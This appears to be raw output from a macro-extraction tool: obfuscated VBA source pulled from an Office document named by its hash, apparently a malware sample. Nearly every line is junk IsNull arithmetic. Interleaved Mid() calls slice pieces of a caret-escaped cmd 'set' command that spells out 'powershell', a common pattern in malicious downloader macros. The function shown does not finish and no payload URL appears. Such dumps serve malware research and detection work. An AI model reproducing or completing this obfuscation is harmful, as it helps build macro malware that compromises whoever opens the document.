Filename     : ./macros/e706b3a32f4c177f1a3536dbd480c639666381b8a68b59821488116c51374eee
OLE stream   : Macros/VBA/TbEIfhKubd
VBA filename : TbEIfhKubd.bas
----------------------------------------
Attribute VB_Name = "TbEIfhKubd"
Function HLWDGDJjMNvf()
dwZtMikXn = IsNull("NaMWuOBV") + IsNull("BzwcjuHYjhL") + IsNull("triiGVC") + IsNull("trGpupEdpY") + IsNull("ljcBbNbfwN") + IsNull("pDDGUih") + IsNull("ntzvlKrHiqqii")
vbHAdJ = IsNull("vUNSAGbXilSG") + IsNull("NLjuTSKUF") + IsNull("LPVQPEuwQ") + IsNull("OoBfjazkwUzCBu") + IsNull("sKjwuTM") + IsNull("FCDfpMSnnBHCZ") + IsNull("ELtUaVkP")
OniWOKGG = Mid("u2jWiLCmAJ%=p&&set %VXKJBmHXCAN9aACaT", 11, 13)
iXnmzl = IsNull("HZVRqDVi") + IsNull("DMrBDlnVVvAkf") + IsNull("krrjGtoIiThv") + IsNull("lDsdTJDvitI") + IsNull("VvVVjhXcmkZzT") + IsNull("lAviYTIHB") + IsNull("cRhbbrBzi")
oEilDzRt = IsNull("XGGjQOwCwWUinH") + IsNull("CUDAXvObaL") + IsNull("lXOUrrj") + IsNull("EjUzEdd") + IsNull("iUcKbBqTYXD") + IsNull("DJijYOcYn") + IsNull("idCkDniUwXt")
iuvfHGFOj = IsNull("lzTmzlJTrBdtKE") + IsNull("CzEUofNtDs") + IsNull("AwAvjbRXd") + IsNull("hIinKpQAojHdD") + IsNull("rzdtRXEQui") + IsNull("NTvSBcmajVrZ") + IsNull("iqztOIKWsbEl")
jTZzqEaC = Mid("DVV96M0pDnmCqwZGMhcBV", 8, 11)
ucrztR = IsNull("jHzAbkhuv") + IsNull("nRzvCobpAE") + IsNull("FpzIrzClEZjUm") + IsNull("XiYnrrsjKpl") + IsNull("IlusIWpYaRws") + IsNull("miJquHwNSiFD") + IsNull("INzYfJX")
zroXuoNF = IsNull("HKbHTVMmt") + IsNull("CPHUBNHODYMYvB") + IsNull("WisJKZb") + IsNull("FClbiiwkYjLw") + IsNull("FQhLRLf") + IsNull("EjOZHwrTciXahB") + IsNull("QlYjEoork")
arzazm = IsNull("pRrMQJfO") + IsNull("GkfDFMi") + IsNull("PhoXpGopGNcYB") + IsNull("oUdwNSiizQwP") + IsNull("VXwDAQiPci") + IsNull("AKCXJvDqBUwK") + IsNull("IzQMljYYaiT")
btzGhaZzhT = Mid("FrKAvipw2LXj0pYZauQMi&&!%mzRfjAk7Grs4k3ZOp", 20, 6)
wSDoN = IsNull("zRNKwtO") + IsNull("oATXBblHQvwoVT") + IsNull("wRZsfaF") + IsNull("rdVHfdJdp") + IsNull("isAwsjzv") + IsNull("YstwijNPsZBiVi") + IsNull("btjUFiGRJira")
irjiEwlYzC = IsNull("VhbPKEunIiCDcN") + IsNull("MIqZntvnE") + IsNull("kPPvzajRrrnd") + IsNull("FhimfkrGni") + IsNull("DmdiKDauWjZoir") + IsNull("IVlkWbjo") + IsNull("rFHPCMczjPsM")
XWwUt = IsNull("zYqvjdh") + IsNull("whmaSOREna") + IsNull("KQXzCcpT") + IsNull("bkRrGKPTi") + IsNull("wsAMdLu") + IsNull("nQpNVEjPlcZnSu") + IsNull("PwOQuUHw")
kTjDuZjsYF = Mid("PCu96iset %qRZwTRMBQ0VjR0ufHvO572LdD", 7, 14)
tDrksNZZvWi = IsNull("wGoQtGnjsDuXcW") + IsNull("DMYUwrqFvK") + IsNull("JDbHOzvLXivFh") + IsNull("BFwBNsaqHuU") + IsNull("XOEHBsGBwjEko") + IsNull("bQwqHHqrzmrDiS") + IsNull("TwhnXchGQ")
uCArl = IsNull("wMJzHMuO") + IsNull("IQZLUicdINa") + IsNull("ZVzXBuAirddZYJ") + IsNull("JnZaLjGSmiQ") + IsNull("QtBNTFM") + IsNull("qKcFRtknfn") + IsNull("nLwSpjn")
tjHuKS = IsNull("DzjfSAONSQJ") + IsNull("RmNBfRSPzKnjd") + IsNull("WzRSuKhMDHJM") + IsNull("ldqPBIaiuaW") + IsNull("PoAjtLzCfiRwAW") + IsNull("KFjFrTmjmGumbC") + IsNull("cWvWiVhf")
zRAmlriEAXP = Mid("aEWL9w&&setw5Or", 7, 5)
PnGfUVYXJ = IsNull("SSDNolskl") + IsNull("QJTMmozLTIRvT") + IsNull("zhdqRaLijrtEn") + IsNull("nUZJwwOdhaZKSi") + IsNull("iwWwPNGHC") + IsNull("KfmccShBC") + IsNull("zjIwWYVADQ")
iSMdtOFri = IsNull("YQXuXKJMLLZY") + IsNull("cwwzaQdcj") + IsNull("lqrYhJUtIT") + IsNull("hhGlUQzXUat") + IsNull("LvQQhWABDoul") + IsNull("fmbDrRQ") + IsNull("ouPsLGz")
JVuQPF = IsNull("HjOCuXFX") + IsNull("jNWroRcBFIrI") + IsNull("HQuoZcqrG") + IsNull("lKCwXZh") + IsNull("cdSqlNQIFwUvuY") + IsNull("rZwIFwdjraIkjl") + IsNull("FcXNPizQi")
tjGkDSbYtM = Mid("ijRuR0QhvXSsk1Ap4iAC6B", 18, 2)
rlVkj = IsNull("EOvsJjcRtmX") + IsNull("SYsmVhod") + IsNull("UdJcbWAAXW") + IsNull("AXzZwsuzJ") + IsNull("JFuImQBc") + IsNull("dSVFklmPiJ") + IsNull("QVPHHvZTncn")
muQIzSozlz = IsNull("vcuoOKQUqzE") + IsNull("FlSHNkVCPz") + IsNull("khMVJopPDlutEZ") + IsNull("opDzmZJMzbdGQd") + IsNull("APwiJGB") + IsNull("HjBjAjLsNiQwj") + IsNull("RMVbVPtfhZmCli")
pRNfNkEv = IsNull("UOKXOUpGwXAsz") + IsNull("ROnMdMpjsop") + IsNull("BrriovqdBrZNX") + IsNull("sDitVXKcdKfbzb") + IsNull("nVWibSwOPiFCTd") + IsNull("pZphTlCzTS") + IsNull("YNhCNvOiNWD")
YlSUwIAzYwW = Mid("JCjBhski4nVwz0XiA6ztzIlQqYPm&&siwsjZ6j4wlzZwG0V", 22, 10)
ljCVslaIUv = IsNull("WPqmAwRlpIdljQ") + IsNull("zjUAzjMill") + IsNull("bwczwzjuqTaJfD") + IsNull("bjSsdJO") + IsNull("ZFhkjOJh") + IsNull("BEUTIrK") + IsNull("FpZEZXpzzHj")
MhwZzfQWvpO = IsNull("cCMqNuTL") + IsNull("nvSiZSRmKfIAjv") + IsNull("oXsnjpw") + IsNull("zFlOcBulQGbvIr") + IsNull("AwHRJiHIsGJBp") + IsNull("fbHoATZ") + IsNull("EpkQtstHAuwir")
cQdqYZRH = IsNull("tImNoCsQN") + IsNull("jjlVIaj") + IsNull("SoHMYUpFzhsn") + IsNull("GdRLsSHiGwuS") + IsNull("JsSEOON") + IsNull("orHjjSXiD") + IsNull("XaRZDTJP")
LozrXfqNzh = Mid("QjYOXaku%=^he^l^l&&sDUXn", 9, 12)
HwjOOJSjK = IsNull("bXoQszsHSzEik") + IsNull("UGHXTMuSjtk") + IsNull("OlGOEKLqA") + IsNull("zjbbvwXlLKIO") + IsNull("tnZLfvJrvjdi") + IsNull("BDutXuil") + IsNull("YwrQzuvh")
nIcMOuZCkcQ = IsNull("ViRLNPLObBKzLb") + IsNull("ovwkcsrdUp") + IsNull("VYKdDpFtZwsUs") + IsNull("QJTNlKYQHjr") + IsNull("BOFiBzWWunDzwU") + IsNull("RCavbDJMjXPii") + IsNull("EQimForou")
UtUfsQn = IsNull("GAwNbfzfvr") + IsNull("ECwsouTqSnOjB") + IsNull("OcTOzOvNHXiI") + IsNull("cOuswntCWwzbC") + IsNull("EPmsQwaNDfQ") + IsNull("cwruaKjGqcXuPw") + IsNull("jsiUnumq")
PaRqHvdRJh = Mid("pDw8uqABApGSGiZCset %WhWNMb84zUA0GlW", 18, 6)
uDTAYJufiZw = IsNull("vzWhdFWPQSHOjk") + IsNull("usCWHlPsD") + IsNull("WZKsjAdHfAdjc") + IsNull("dAzRLKpkuWKv") + IsNull("RnJjFSrHfLWkR") + IsNull("GBkmNQTsGmz") + IsNull("tzmfoilLLTWT")
OKMpaQ = IsNull("QjAjfOKlmzAWhz") + IsNull("UzbinEMHXmSObT") + IsNull("RzkoXhvXNGnPr") + IsNull("PqklOFSDlQoD") + IsNull("dtNAiRwfCl") + IsNull("cRYcNbApVaHvh") + IsNull("NNVNLUzTISd")
KGwwqj = IsNull("Olbwochtjj") + IsNull("JkzfVZhWiYZr") + IsNull("AXozGSmfQO") + IsNull("isuRJQnMQDVDlF") + IsNull("mmzlzotFzRnin") + IsNull("wDtVzAdiP") + IsNull("SlMaSfTD")
jFaJqSl = Mid("TY9szFDrzXpAFK8au!    kOwZjk", 18, 5)
oTcnXYTzYHJ = IsNull("FEzsBMF") + IsNull("JwjppKPzizVwf") + IsNull("VEcRrRtIJF") + IsNull("NVvrcZvppTRjfY") + IsNull("EAlKziU") + IsNull("jtQjVowAnarc") + IsNull("THGYaIqEDXztp")
ELRpGnjNb = IsNull("KrCzGlb") + IsNull("ZWoZhBiGhOwj") + IsNull("rnQwPHJPiiV") + IsNull("XiJraiDOGso") + IsNull("ECjUPhQtWa") + IsNull("DmBqiSRqoT") + IsNull("KTZOGjtVXwzstN")
fYKOXKWkHMs = IsNull("sXwITsoM") + IsNull("LpZBrSiFovMktf") + IsNull("XWicfWTpfbGd") + IsNull("SXkAGJuiAHzmZ") + IsNull("IwcczsMlz") + IsNull("LhbsAuakp") + IsNull("nRKMdjkDWOfqF")
wdCaNm = Mid("aM7sfJCiiGRm6WYuVduCbQwCKC248v5Cqf mZvoW", 21, 2)
drqIkkDoM = IsNull("ozBRcFwOFF") + IsNull("nZvpBzEHrP") + IsNull("BajAADUEtHdFdS") + IsNull("WqrNFTJhwTZhz") + IsNull("nmVIswakbEttAM") + IsNull("KTSXMcNPi") + IsNull("cstkhbVX")
OHbUqfS = IsNull("wGKCBNIOjMb") + IsNull("mXMpQEiSQKmFLQ") + IsNull("uCzDDDk") + IsNull("ODilHAj") + IsNull("KOSvFOS") + IsNull("bzbOoTFqkI") + IsNull("LjJXvCWzl")
FFCQCCkN = IsNull("FUHzlUO") + IsNull("PmTLSwPlzHKk") + IsNull("aWqwQFjzud") + IsNull("WvGzDWhDzq") + IsNull("cLzJviwhUKmifz") + IsNull("zUOhmUJup") + IsNull("pSicaHmfbu")
BnbpohziX = Mid("CswOCQp04GcVjM7TQQG 9ZqCAuiJ4lppsJ6tVDQ", 24, 1)
aijoabAi = IsNull("SXSkEcqtUwjk") + IsNull("bGcWLuwoAwm") + IsNull("WBqWtiQhlI") + IsNull("JikrOzQJibG") + IsNull("RTfLCnzSYfOi") + IsNull("AWbQPDrTjTr") + IsNull("DjqjoDuPTYD")
nqCwXRZ = IsNull("ROKlGKM") + IsNull("MhroprzQ") + IsNull("oQnGnTW") + IsNull("NpfpijGSuT") + IsNull("rUjsNbCI") + IsNull("TbIwSGwsoudvn") + IsNull("tVhVhwlVu")
vLchjwVKoSN = IsNull("XNtoqBdQB") + IsNull("NbptSYOOl") + IsNull("okzDGik") + IsNull("USHbTNsBJDd") + IsNull("pbZnVOuukWB") + IsNull("nCZmOqh") + IsNull("RAwjImIc")
DVtXEfRp = Mid("aE2pNlcj595n%=v9IVNicHchbr9s", 12, 3)
QESdQjJk = IsNull("pZiHYaikLh") + IsNull("ljjXXlO") + IsNull("zpMDEmWjGUK") + IsNull("zhkIsYq") + IsNull("OQskGNIpAz") + IsNull("MWrvidWd") + IsNull("BtXQAcEEvY")
CEXYZOFs = IsNull("iLlziKHqAjUS") + IsNull("HFQfJZHW") + IsNull("SsiQMwwcoNzLk") + IsNull("pnWfrqEwEz") + IsNull("oDNTzDOKrt") + IsNull("VRzLtXrHUzXia") + IsNull("muQfmTnhwYsiJ")
LolZa = IsNull("wvuPjwbwqih") + IsNull("IKzhGlBiWuU") + IsNull("UscjiJDtb") + IsNull("LQcbLmBam") + IsNull("TNPGCvzSttIEa") + IsNull("vqUsShanEpw") + IsNull("EfZPdvIiwGdW")
LSWsjUGTftG = Mid("E3MKf      vvlT4wi9mjQfLwQR", 6, 6)
pjFJbfPj = IsNull("KjBsdwSEhjwhH") + IsNull("cWQUnbLJwfFZEn") + IsNull("ZSLNAwkwfF") + IsNull("ZhMkjFMqEaI") + IsNull("vifAlWnDri") + IsNull("INlTGAsZkOIB") + IsNull("wOwzNOjuQtP")
GKQRfwoG = IsNull("TMQwpzNHXjpVQ") + IsNull("oDsNkMXvjzYid") + IsNull("bMMQkGA") + IsNull("DDpwCSzipG") + IsNull("uPTDlAfS") + IsNull("jTZKWIjLUY") + IsNull("KnQAoYlKFwCH")
rWqXDhYLSn = IsNull("UwzarCmuzEW") + IsNull("lFpMAXKmhCEXZn") + IsNull("dvpsUVolEsztL") + IsNull("HfsrwNHZXt") + IsNull("jdzSrcADMIzIL") + IsNull("czTkTBi") + IsNull("QZWLfbZiEXvzls")
KXntqkHujlj = Mid("Nai3OiulWw7w3zu6ObqifDWiRlwN&&RrCfkQRODQC4", 24, 7)
rSRrjz = IsNull("VipHIbQEn") + IsNull("rjdicumnKQU") + IsNull("HwTONOVNadLHpn") + IsNull("YCtIjXKZQ") + IsNull("tJQTJrrz") + IsNull("brotNBjaCN") + IsNull("VopaNkQHob")
sDluzCQcKzw = IsNull("qbzpiSQoEbdiL") + IsNull("srQSLzuof") + IsNull("zqXORdVj") + IsNull("tZLvVDhIuGWp") + IsNull("wFXjTWRl") + IsNull("CwopruBWaGtzRo") + IsNull("vvPipzhJTssR")
EEumjRpJ = IsNull("ZCDTFFtRlUJTMc") + IsNull("JfGzwILspEUp") + IsNull("YbjJudR") + IsNull("qtwdjkbDMVdw") + IsNull("blBripNKNPl") + IsNull("ntKlAYiKw") + IsNull("lKTQXjodi")
EwnDfumX = Mid("LQstphowVE%=AvjNwfJRwfpaE", 4, 14)
ujQFjPU = IsNull("kKwSvzWPHfMnG") + IsNull("fPvJhRplXH") + IsNull("vzUmVzzdKlPHb") + IsNull("URRoQDq") + IsNull("bCtXiLzBznri") + IsNull("ABclhMKwlPIUHM") + IsNull("YzHEwMV")
sKPtML = IsNull("jjDHNpMHoCEcf") + IsNull("zQaojOPP") + IsNull("OlfqGzDqdjXh") + IsNull("vrdJhYiDKRaw") + IsNull("BmKWLcRAoWi") + IsNull("GKkLbwHcQUiLWh") + IsNull("jfETEtjvQfHUu")
nHlBI = IsNull("twOndImcQ") + IsNull("CUPpCiqjnpmlDb") + IsNull("zdBfmhmijinTZh") + IsNull("zmrXEskjvYOPZ") + IsNull("jIvmpdflziP") + IsNull("pjGPORzzq") + IsNull("tjXGOuGGXRMzCa")
nYqMjwfEK = Mid("Ejn28MQZtKpt8XKRdJJ0mPaj&&PUCLr3RO5", 24, 3)
MChRvVI = IsNull("hHVuKaNwr") + IsNull("UTUKhEzzdlkV") + IsNull("CiFaPUjUcMLi") + IsNull("MQLGdinWz") + IsNull("ZVOMjHqJfLWS") + IsNull("FAwiLOsGI") + IsNull("TrinXIChODt")
IZooCiicDmc = IsNull("lrjKIoza") + IsNull("vRGBFvQq") + IsNull("zlbUoPnHPiYUfO") + IsNull("VZpwFwKdNi") + IsNull("GIkzdOhCTX") + IsNull("RDUWAZVBrQDm") + IsNull("jFSlAnINqSI")
fpPskQpZLGd = IsNull("EAHzMlDfWqu") + IsNull("GGfEbHGfQuuUzT") + IsNull("BdiIOXZvzW") + IsNull("BHCcEdzj") + IsNull("QcwGGzOPKFmC") + IsNull("SCCshfcjKhhPG") + IsNull("cnpRXOmCYiYCRJ")
pdjGVUOUp = Mid("QL3dm4OWTfmSwWOK9WLNuYv63XDP!%NWIwSpjw%bQtvDD", 29, 11)
uGVlpzllTmX = IsNull("WSBJncuwmIm") + IsNull("izkILmFCVEQ") + IsNull("wvCjPVakLq") + IsNull("HTsDnJqtYTo") + IsNull("DCACDNG") + IsNull("RBdNsaOj") + IsNull("hCSrTcoTj")
iPmbdhnRwwN = IsNull("aLlKtfhmJ") + IsNull("dDNvwpO") + IsNull("ZJlTUMhN") + IsNull("GCUJAahOM") + IsNull("obBTBcilz") + IsNull("oGmdqjnfGqZcf") + IsNull("ajorddjhk")
UJhAzG = IsNull("tiKrEIrzd") + IsNull("SXXFjMGqf") + IsNull("NuKdrQWL") + IsNull("ZLjUuNfGJZFA") + IsNull("kRzKiMKGWwo") + IsNull("EwUhAnlfPD") + IsNull("jDcsBFw")
cWFkBbItCl = Mid("uCGErnQjQ   O1b", 10, 3)
zEFupN = IsNull("ajXpkqpahX") + IsNull("APrSTmCHVt") + IsNull("vktRnnIW") + IsNull("HWPCHIzu") + IsNull("BwvIsZTzY") + IsNull("qdZOdPnn") + IsNull("SCCSKNRiAoLLpH")
VVMohX = IsNull("GNqYFJWI") + IsNull("rEYVTHiF") + IsNull("fnTwXkJLLWQRW") + IsNull("KBZiazZXisT") + IsNull("uohVMvSTU") + IsNull("sHqGPtzzru") + IsNull("aOTudEGOHJ")
iIotqF = IsNull("UuQnrTwqOwjjh") + IsNull("mnUVAcNz") + IsNull("kvavTJNwAWi") + IsNull("jzzvdTMnUihjWO") + IsNull("rqoiiVN") + IsNull("sRXfjAAfJzN") + IsNull("oUZXIAL")
TdVqXjJwpU = Mid("hfa26YNkbscb2b!!%qRoWQCIbhzO37", 15, 5)
cKliTIWssJ = IsNull("iFpUdqKVzCI") + IsNull("IRoUjjaiAZzT") + IsNull("OajrLENPRck") + IsNull("vQHpWuSSc") + IsNull("dokWihia") + IsNull("IWuPPad") + IsNull("zvWroDDnQSodi")
NdmNwT = IsNull("IWzDnRLCUp") + IsNull("bIUvtYw") + IsNull("FUdjhaApPPQXX") + IsNull("lBEHAdcju") + IsNull("kwNRPaOVIbO") + IsNull("fmQcmbw") + IsNull("DRiKXTrlXUPVZ")
PLrklUIsjq = IsNull("BzDzvHoWfkr") + IsNull("cuBArPsHUW") + IsNull("TokjjSO") + IsNull("wadUwLRfWwbPm") + IsNull("RbJlPaZlXJirkJ") + IsNull("aFDRtuww") + IsNull("EoZjWItHTT")
iHtsQt = Mid("437TZLbset %NWI83V", 8, 8)
jEjHb = IsNull("ziNjaoBvOwCiWR") + IsNull("XqAnGZSQCtvid") + IsNull("nLsdfniPCBHmID") + IsNull("IpwZtAiOiTZj") + IsNull("KqiFYzakJ") + IsNull("qiJHnzf") + IsNull("RPitEwJjwJ")
CsnrDjqlZ = IsNull("pzwHqioiQOAj") + IsNull("hwcQtdYrIM") + IsNull("tkUtMSR") + IsNull("FXjMMFKI") + IsNull("pacPDzKGBuc") + IsNull("OphlvOFOvVzws") + IsNull("BzkPKjUsChj")
iJJCjwoXC = IsNull("KKFGQEMXBOLcBz") + IsNull("GuktqPCwIQnR") + IsNull("fwoBRowulXtC") + IsNull("biGFncuTsOz") + IsNull("SjILwpd") + IsNull("arFZJKMAqUXqq") + IsNull("nYrCdKWSm")
IWdzDbhmar = Mid("5ll36D4XG8EiUwWOdcvkVsAfpRwoww4Pu5j6XXjM1uZ", 12, 11)
TpSROGo = IsNull("plJmKYoTqiCaR") + IsNull("EukTcfXZwNWlj") + IsNull("UWnzBGYUEILZI") + IsNull("nTuJwTiaIj") + IsNull("EQQmwPZ") + IsNull("vwUuCYKSjpbID") + IsNull("wliSNnQPtO")
IsYXkmnz = IsNull("jVuNBDa") + IsNull("JLwZPNJzjcCs") + IsNull("EiCFapRhXb") + IsNull("jXKvcQY") + IsNull("PNEUZnRWAUK") + IsNull("BFhirsHbO") + IsNull("FlkrpsDN")
MpjbauXvMi = IsNull("vzpIhIs") + IsNull("lMaTYslnBulj") + IsNull("BjSfIdCmYjE") + IsNull("rHaUJBhi") + IsNull("SKXSGaczOU") + IsNull("hctRXdZi") + IsNull("zNjVMjkKSrsDw")
MlQjB = Mid("jQ7idjbLDiliXnXXFt7DYET2RRw8iznbAh", 21, 3)
wAXIFa = IsNull("PDbcJAJcRI") + IsNull("QMMLDdpjE") + IsNull("IzNGISkizYTn") + IsNull("uNadXdhPqSvssY") + IsNull("oMDXJlHFNW") + IsNull("iZuUkzd") + IsNull("RzcARCWT")
cSvwvpuld = IsNull("daJDBdRKdaKCf") + IsNull("zuMzVcJc") + IsNull("kBJAnGuOScH") + IsNull("qpfFPEc") + IsNull("SEfwZwXdNCqiA") + IsNull("YBrdiDjMrZXHJF") + IsNull("uFYhmKjWLar")
jShYqCHL = IsNull("fROPtLulV") + IsNull("dOnHMGVvHVViwO") + IsNull("HbLMlUmRoaw") + IsNull("moOAjOCA") + IsNull("iqQtvHOwwwVzjm") + IsNull("iYkbqwzjQwjH") + IsNull("VmTtOhdkvSpNYT")
uvKbfQubq = Mid("0EoObjCl0B7vmClvsV3D4bkuzOwCcwSpjwKmXKn5l52Q", 30, 5)
rmMHiCb = IsNull("QAPlYBtRiNlZ") + IsNull("GFMFaRmSzT") + IsNull("SAOnsijDnVSLcn") + IsNull("GQoCjTwIjETRlI") + IsNull("QThSTYn") + IsNull("YzhimDn") + IsNull("kRaLWivmdTshiY")
UhBiIoViuii = IsNull("WfGwtsRwJX") + IsNull("nCiNhGf") + IsNull("faAbdtw") + IsNull("kiiMYuhwvcX") + IsNull("CwnFsHLGcr") + IsNull("BWGYuWEd") + IsNull("vNjTbLi")
sttnHaXZai = IsNull("uviFzdJTb") + IsNull("KPCwlMFsK") + IsNull("zKwhlYuoAfFX") + IsNull("lnmDzoQ") + IsNull("wzsMPsosGmo") + IsNull("qOjzBTbiUS") + IsNull("NmOQLwIHEtHBKE")
WGALbza = Mid("ADJm4J6bmI!R6JvnnnK6NuPUB2GdwGTj9Ds", 11, 1)
RmIbLwoHB = IsNull("ViSFiGBjmviWh") + IsNull("CtTjqSWmZrzUd") + IsNull("PTdhcSkuZGTQE") + IsNull("HbVHWCKnAuUMW") + IsNull("IaFOcMUSRAtO") + IsNull("ITMNaOji") + IsNull("VszaibSiNPwClw")
wznfuNnTI = IsNull("DiZWFlViTL") + IsNull("HwcXSBNi") + IsNull("MUvAqzJ") + IsNull("bMrdkDq") + IsNull("PPErTsN") + IsNull("fijWFHFNvN") + IsNull("inZfHcTG")
QBiYj = IsNull("FnrVpKU") + IsNull("HvCTohtzp") + IsNull("KENQBhs") + IsNull("jndRFWVLHnWLpn") + IsNull("iqfcHiA") + IsNull("SHwatnplJc") + IsNull("ahjppfwcZGbiO")
YwNfaGn = Mid("jkdbN5Qwq7uUZEXs027INq4DGmG%=o^we^r^sQ4Bns", 24, 14)
rrMzL = IsNull("UhWslSDl") + IsNull("qjUGXVHO") + IsNull("wUHdhWtHRpkw") + IsNull("AlGDzLqkm") + IsNull("UFEjpcQ") + IsNull("XtpXmzr") + IsNull("AwiANBLbjiATXw")
zkaboOfMow = IsNull("XjoIprrowtoXTz") + IsNull("tYEbOnHwOzkjpl") + IsNull("puWuZUQv") + IsNull("qubjAEDhAJtpZJ") + IsNull("IQkaKFKCD") + IsNull("EuBZYcddJlTM") + IsNull("wJuDjfrXPkH")
KGsEIkdHj = IsNull("BKQmYcqEfB") + IsNull("MDacwHMwLsFl") + IsNull("TtdzHcwhbWnNW") + IsNull("TWJuzwcpI") + IsNull("DjsHZli") + IsNull("YaTiwqwDFDkhmP") + IsNull("utbBwGmNikc")
wiqzjiX = Mid("KuuNtf5dW0aZm5l5K52tm0wEA", 20, 1)
tDnSNGEQpzK = IsNull("IjplpfsXwvKB") + IsNull("chQLQYvv") + IsNull("lQPBdWLLpJunP") + IsNull("nrTFapiDztvEw") + IsNull("LwMMqTwYVnC") + IsNull("MkFAGTModT") + IsNull("TUGLiRWGZXjAqz")
VcQqhScDXp = IsNull("EukrcZzjJ") + IsNull("PHaUpLdJDZT") + IsNull("HwBNFaQFzB") + IsNull("GtjVIjIuiw") + IsNull("AcUPoPdjaNwjnl") + IsNull("OTYPDfNmTaJpV") + IsNull("uikaJwYtqmB")
vTGmkOViK = IsNull("zwuOWfDEctzw") + IsNull("crJwrBtrkIPGz") + IsNull("cwckODXWQuOz") + IsNull("PQdRlTidi") + IsNull("lIpErMnfH") + IsNull("zaFzIiuPGa") + IsNull("jujdaHqdm")
rpoULrJGWb = Mid("qoC0jNoCNf6mrpam", 6, 5)
clvbOjjf = IsNull("QaHJNsjSRpW") + IsNull("tSmqAoiZI") + IsNull("fiMFdnR") + IsNull("dmObOnfKNQ") + IsNull("CLFIRhr") + IsNull("itBHbTMu") + IsNull("zHPwBwMjES")
MfzFz = IsNull("VWnhsJTv") + IsNull("kGTbEiw") + IsNull("qozWaiGJ") + IsNull("jTlSVjwSzrXWlX") + IsNull("lFNIqvvGjiqi") + IsNull("nvrjYtZz") + IsNull("lPWXIFnZ")
GDTzK = IsNull("zKpbOTF") + IsNull("ZZuYmbiabinHB") + IsNull("GMFAJBOtYNPnM") + IsNull("EasHOUVwDj") + IsNull("VTVkFRLCGEc") + IsNull("OKEijBhJwO") + IsNull("WAljshXH")
APfOiZOrF = Mid("ib7400JJuwuYvCJUAnStF%n9n2h8DwiWP7", 12, 11)
ltokwfRTLR = IsNull("ERPkVRwTDnMBj") + IsNull("BlfEzqzszha") + IsNull("zlSmqTKvmQ") + IsNull("CZaiFplmJBlVld") + IsNull("njpMThK") + IsNull("TMAQztr") + IsNull("rkrciYHsCMvRT")
cifpItzOrfo = IsNull("BcbzPQPzqKf") + IsNull("ltaoQjzmvRcC") + IsNull("FlPRLBMrUwiriX") + IsNull("FTIwjHoEPMJFT") + IsNull("kjAYzKizjfJTrQ") + IsNull("wwiIEhbIfSqQjz") + IsNull("BwswkOi")
MFowGn = IsNull("QhJqjaFZ") + IsNull("MsYHWFYotRMtku") + IsNull("VObzJHm") + IsNull("hGvTHGNQjSnik") + IsNull("RlndYBz") + IsNull("SfnJURzH") + IsNull("pZwqAalRh")
kqrriD = Mid("7rjSG7VonqXWmni5NsRWuhbwuVWqIzWXsWiNuLnTbPzwHz", 22, 9)
MDbLRR = IsNull("iNOFndnPQ") + IsNull("JTPbwPNIbU") + IsNull("ItzAbiN") + IsNull("ufjSizupcof") + IsNull("CasXjpZzcjbnJ") + IsNull("aUREMzao") + IsNull("scBkbBZlUv")
lfIkzL = IsNull("vVBkPcXTPTNw") + IsNull("ovtzsiRJWUVbr") + IsNull("DQioTBvLuuc") + IsNull("YDpRnSpHvKfw") + IsNull("bVcYBfIXzU") + IsNull("jftvwdB") + IsNull("UKKOTFhCmjjtkl")
HAclAOEt = IsNull("DhAZTlENwLD") + IsNull("ISYaXXbfSOEAu") + IsNull("EzzDwHrhIsT") + IsNull("lavMpKojsSCbB") + IsNull("sPJpdAioh") + IsNull("QvNwAaJ") + IsNull("GfmBkGYuMKm")
wOdwc = Mid("iuJ9FcwOBb           bciDPtpui", 11, 11)
FXPNAap = IsNull("rjTmtPUJbj") + IsNull("kIZtJSJjcJRG") + IsNull("TUcVnOaS") + IsNull("LBPirHjzBifhUZ") + IsNull("saQkEJKaZKT") + IsNull("mwVNITqwYi") + IsNull("aBwcHjbbwuz")
XpMjPS = IsNull("mQJFbdtVALtG") + IsNull("IKAAwMzZANovE") + IsNull("zGvlkqhU") + IsNull("wwWHzPCtQZhvu") + IsNull("XhwaLmDU") + IsNull("WUuPEZIP") + IsNull("oTDCcFAK")
YVpvroao = IsNull("NzqNlAbpUXj") + IsNull("BfVXNicFNvpiIj") + IsNull("qwjUinV") + IsNull("QRFFwwpK") + IsNull("SwbbNEN") + IsNull("StPSHHFEzk") + IsNull("kCEKfXEFHYjIY")
doQYZTO = Mid("w9JY0jdi2DF6XfwUhIJTmTC0ruet %YvCJUAnStF44wiblVipOau", 27, 14)
VYBbzNb = IsNull("TYVXMEzYDoPVin") + IsNull("oznCAwTHJYH") + IsNull("DVFraBojvoz") + IsNull("qQjVUAnG") + IsNull("cNcRzJwARLz") + IsNull("cvCwwoU") + IsNull("DfzAfMkSznJkB")
zfzilZrCcEt = IsNull("NFwOMpwVkSL") + IsNull("ozwNfQQEYQwcf") + IsNull("jEWiFHSD") + IsNull("VpjUJlfPhdQSv") + IsNull("PdVtnEzIUizGuz") + IsNull("NDakMbX") + IsNull("wGSsAOwPunKGAj")
sCQsiaoYT = IsNull("bIcZdrqjicACOU") + IsNull("XXLSMbwNcml") + IsNull("jCdCODjUtV") + IsNull("LdDUAWzdwP") + IsNull("aPzRpTiuznsRK") + IsNull("BamwhzkBzAp") + IsNull("HvqdImJr")
PWJmwd = Mid("2TzFsc6QIXp9sAa%=DMWDlVHLRER7NwwVukrN2o577kic", 15, 13)
ZJrkIWhl = IsNull("fzpMVBUDr") + IsNull("JUaqhjSsiZmU") + IsNull("zuWTFSjs") + IsNull("dpulXPC") + IsNull("cCbLqtYZMEsOSK") + IsNull("LnsSzhOlHoE") + IsNull("kvwMCqozksAGA")
spQXXQlWj = IsNull("RSKjlDdYt") + IsNull("RUqXuzNF") + IsNull("SBvnnalC") + IsNull("XUQATvwJLSUEc") + IsNull("WAcKLCwvqGILOV") + IsNull("WJzBkAZtQBv") + IsNull("lnvlHqDZmL")
GSYfskT = IsNull("usOrdmSNjzfzCM") + IsNull("RUXmCndQr") + IsNull("YiNrSnlRBnWWP") + IsNull("SYXMwhFn") + IsNull("kSYdUzKQbWC") + IsNull("HFWQKtf") + IsNull("ZqvEMTi")
lbvtj = Mid("Oset %HWFjCJAJmsUOCBsL6jsRW", 2, 8)
JKcRHTktwN = IsNull("azzciJsHj") + IsNull("dpJUCswzGMJ") + IsNull("dKHvVBULw") + IsNull("LtYBmYvjXtOvH") + IsNull("lQEwGcjzGKWmVj") + IsNull("rmVhldQvBFYCX") + IsNull("PBiCIJEwWEUMM")
